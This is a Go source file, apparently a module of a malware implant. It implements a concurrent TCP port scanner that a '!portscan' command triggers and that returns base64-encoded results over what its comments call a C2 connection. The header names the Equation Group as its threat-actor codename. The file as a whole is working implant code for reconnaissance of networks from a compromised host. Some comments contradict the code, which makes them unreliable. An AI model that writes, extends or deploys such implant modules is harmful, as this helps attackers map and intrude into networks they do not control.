// ============================================================================
// portscan.go — TCP connect port scanner
//
// Threat-actor codename: Equation Group (NSA TAO) — hence "equation*" names.
// Implements a concurrent, semaphore-bounded TCP connect scanner that
// supports CIDR targets, mixed port specs, and runtime cancellation.
// ============================================================================

package main

import (
	"encoding/base64"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ============================================================================
// PACKAGE-LEVEL STATE
// ============================================================================

// equationScanMu guards all scan-state variables below.
var equationScanMu sync.Mutex

// equationScanRunning reports whether a scan is currently in flight.
var equationScanRunning bool

// equationScanCancel is closed by equationPortScanStop to abort the scan.
// A new channel is allocated for every new scan.
var equationScanCancel chan struct{}

// ============================================================================
// PUBLIC API
// ============================================================================

// equationPortScan is the primary entry point for the !portscan command.
// It parses the target (single IP or CIDR block) and portSpec (comma-separated
// ports and/or ranges such as "22,80,100-200,443"), then performs a concurrent
// TCP connect scan bounded to scanWorkers goroutines.
//
// Results are collected per host and returned to conn as a single base64-
// encoded block using protoOutFmt.  An in-progress scan can be cancelled by
// calling equationPortScanStop from another goroutine.
//
// Parameters:
//   - conn:      C2 connection to write results / errors to
//   - target:    single IPv4 address or CIDR notation, e.g. "10.0.0.0/24"
//   - portSpec:  port specification string, e.g. "22,80,100-200,8080"
//   - timeoutMs: per-connect timeout in milliseconds
func equationPortScan(conn net.Conn, target, portSpec string, timeoutMs int) {
	// ---- Guard: only one scan at a time ----
	equationScanMu.Lock()
	if equationScanRunning {
		equationScanMu.Unlock()
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "scan already running; use !portscanstop first")))
		return
	}
	cancel := make(chan struct{})
	equationScanCancel = cancel
	equationScanRunning = true
	equationScanMu.Unlock()

	// Always clear running flag when we return.
	defer func() {
		equationScanMu.Lock()
		equationScanRunning = false
		equationScanMu.Unlock()
	}()

	deoxys("equationPortScan: target=%s portSpec=%s timeoutMs=%d", target, portSpec, timeoutMs)

	// ---- Parse inputs ----
	ports := equationParsePorts(portSpec)
	if len(ports) == 0 {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "no valid ports in spec: "+portSpec)))
		return
	}

	var hosts []string
	if strings.Contains(target, "/") {
		hosts = equationExpandCIDR(target)
	} else {
		hosts = []string{target}
	}
	if len(hosts) == 0 {
		conn.Write([]byte(fmt.Sprintf(protoErrFmt, "no hosts derived from target: "+target)))
		return
	}

	deoxys("equationPortScan: scanning %d hosts × %d ports", len(hosts), len(ports))
	conn.Write([]byte(fmt.Sprintf(protoInfoFmt,
		fmt.Sprintf("scanning %d host(s), %d port(s), timeout %dms", len(hosts), len(ports), timeoutMs))))

	timeout := time.Duration(timeoutMs) * time.Millisecond

	// ---- Concurrent scan with semaphore ----
	const scanWorkers = 256

	type result struct {
		host string
		port int
	}

	sem := make(chan struct{}, scanWorkers)
	resCh := make(chan result, scanWorkers*2)

	// Producer: enqueue (host, port) work items
	guardedGo("equationPortScan-producer", func() {
		defer close(resCh)
		var innerWg sync.WaitGroup

		for _, host := range hosts {
			for _, port := range ports {
				// Cancellation check
				select {
				case <-cancel:
					deoxys("equationPortScan: cancelled by stop signal")
					innerWg.Wait()
					return
				default:
				}

				// Acquire semaphore slot
				select {
				case sem <- struct{}{}:
				case <-cancel:
					deoxys("equationPortScan: cancelled while waiting for sem")
					innerWg.Wait()
					return
				}

				h := host
				p := port
				innerWg.Add(1)
				go func() {
					defer func() {
						<-sem
						innerWg.Done()
					}()

					addr := fmt.Sprintf("%s:%d", h, p)
					c, err := net.DialTimeout("tcp", addr, timeout)
					if err == nil {
						c.Close()
						select {
						case resCh <- result{host: h, port: p}:
						case <-cancel:
						}
					}
				}()
			}
		}
		innerWg.Wait()
	})

	// Collect results keyed by host, preserving insertion order via a slice.
	type hostEntry struct {
		host  string
		ports []int
	}
	hostIndex := map[string]int{}
	var ordered []hostEntry

	for r := range resCh {
		if idx, ok := hostIndex[r.host]; ok {
			ordered[idx].ports = append(ordered[idx].ports, r.port)
		} else {
			hostIndex[r.host] = len(ordered)
			ordered = append(ordered, hostEntry{host: r.host, ports: []int{r.port}})
		}
	}

	// ---- Format output ----
	var sb strings.Builder
	if len(ordered) == 0 {
		sb.WriteString("No open ports found.\n")
	}
	for _, e := range ordered {
		// Convert ports to comma-separated string
		portStrs := make([]string, len(e.ports))
		for i, p := range e.ports {
			portStrs[i] = strconv.Itoa(p)
		}
		sb.WriteString(fmt.Sprintf("%s: %s\n", e.host, strings.Join(portStrs, ",")))
	}

	encoded := base64.StdEncoding.EncodeToString([]byte(sb.String()))
	conn.Write([]byte(fmt.Sprintf(protoOutFmt, encoded)))
	deoxys("equationPortScan: done, %d hosts with open ports", len(ordered))
}

// equationPortScanStop signals an in-progress scan to abort.
// Safe to call from any goroutine; a no-op if no scan is running.
// Sends a confirmation info message to conn when a running scan is stopped.
//
// Parameters:
//   - conn: C2 connection to write status to (may be nil for internal stop)
func equationPortScanStop(conn net.Conn) {
	equationScanMu.Lock()
	running := equationScanRunning
	ch := equationScanCancel
	equationScanMu.Unlock()

	if !running || ch == nil {
		if conn != nil {
			conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "no scan running")))
		}
		return
	}

	// Close only once — use a recover to swallow double-close panics.
	func() {
		defer func() { recover() }()
		close(ch)
	}()
	deoxys("equationPortScanStop: stop signal sent")
	if conn != nil {
		conn.Write([]byte(fmt.Sprintf(protoInfoFmt, "scan stop signal sent")))
	}
}

// ============================================================================
// HELPER: CIDR EXPANSION
// ============================================================================

// equationExpandCIDR converts a CIDR block (e.g. "192.168.1.0/24") into a
// flat slice of host address strings.  The network address and broadcast
// address are excluded for /24 and larger blocks to avoid wasting probes.
//
// Parameters:
//   - cidr: CIDR notation string
//
// Returns: slice of IP address strings; empty on parse error
func equationExpandCIDR(cidr string) []string {
	ip, ipNet, err := net.ParseCIDR(cidr)
	if err != nil {
		deoxys("equationExpandCIDR: parse error for %q: %v", cidr, err)
		return nil
	}

	// Count bits to decide whether to strip network/broadcast.
	ones, bits := ipNet.Mask.Size()
	hostBits := bits - ones
	stripEdges := hostBits >= 2 // only strip for /30 and larger; /31,/32 are point-to-point

	var hosts []string
	// Iterate from the first address in the network.
	for cur := cloneIP(ip.Mask(ipNet.Mask)); ipNet.Contains(cur); incrementIP(cur) {
		s := cur.String()
		// Skip network address (first) and broadcast (last) when appropriate.
		if stripEdges {
			if cur.Equal(ip.Mask(ipNet.Mask)) {
				continue // network address
			}
			// Broadcast: all host bits set to 1
			bcast := broadcastIP(ipNet)
			if cur.Equal(bcast) {
				continue
			}
		}
		hosts = append(hosts, s)
	}

	deoxys("equationExpandCIDR: %s → %d hosts", cidr, len(hosts))
	return hosts
}

// cloneIP returns a copy of ip so we can mutate it independently.
func cloneIP(ip net.IP) net.IP {
	dup := make(net.IP, len(ip))
	copy(dup, ip)
	return dup
}

// incrementIP increments an IP address in-place by 1 (big-endian).
func incrementIP(ip net.IP) {
	for i := len(ip) - 1; i >= 0; i-- {
		ip[i]++
		if ip[i] != 0 {
			break
		}
	}
}

// broadcastIP calculates the broadcast address for the given network.
func broadcastIP(n *net.IPNet) net.IP {
	ip := n.IP.To4()
	if ip == nil {
		ip = n.IP
	}
	bcast := make(net.IP, len(ip))
	for i := range ip {
		bcast[i] = ip[i] | ^n.Mask[i]
	}
	return bcast
}

// ============================================================================
// HELPER: PORT SPEC PARSING
// ============================================================================

// equationParsePorts converts a mixed port specification string into a sorted
// slice of unique port integers.
//
// Supported syntax examples:
//   - "22"           → [22]
//   - "22,80,443"    → [22, 80, 443]
//   - "1-1024"       → [1, 2, …, 1024]
//   - "22,80,100-200,443" → [22, 80, 100, 101, …, 200, 443]
//
// Invalid tokens are silently ignored.  Ports are clamped to 1–65535.
//
// Parameters:
//   - spec: port specification string
//
// Returns: deduplicated slice of valid port numbers (order: spec order, ranges inline)
func equationParsePorts(spec string) []int {
	seen := make(map[int]struct{})
	var ports []int

	addPort := func(p int) {
		if p < 1 || p > 65535 {
			return
		}
		if _, dup := seen[p]; dup {
			return
		}
		seen[p] = struct{}{}
		ports = append(ports, p)
	}

	for _, token := range strings.Split(spec, ",") {
		token = strings.TrimSpace(token)
		if token == "" {
			continue
		}
		if strings.Contains(token, "-") {
			parts := strings.SplitN(token, "-", 2)
			lo, err1 := strconv.Atoi(strings.TrimSpace(parts[0]))
			hi, err2 := strconv.Atoi(strings.TrimSpace(parts[1]))
			if err1 != nil || err2 != nil {
				deoxys("equationParsePorts: bad range token %q", token)
				continue
			}
			if lo > hi {
				lo, hi = hi, lo // tolerate reversed ranges
			}
			for p := lo; p <= hi; p++ {
				addPort(p)
			}
		} else {
			p, err := strconv.Atoi(token)
			if err != nil {
				deoxys("equationParsePorts: bad port token %q", token)
				continue
			}
			addPort(p)
		}
	}

	deoxys("equationParsePorts: spec=%q → %d ports", spec, len(ports))
	return ports
}

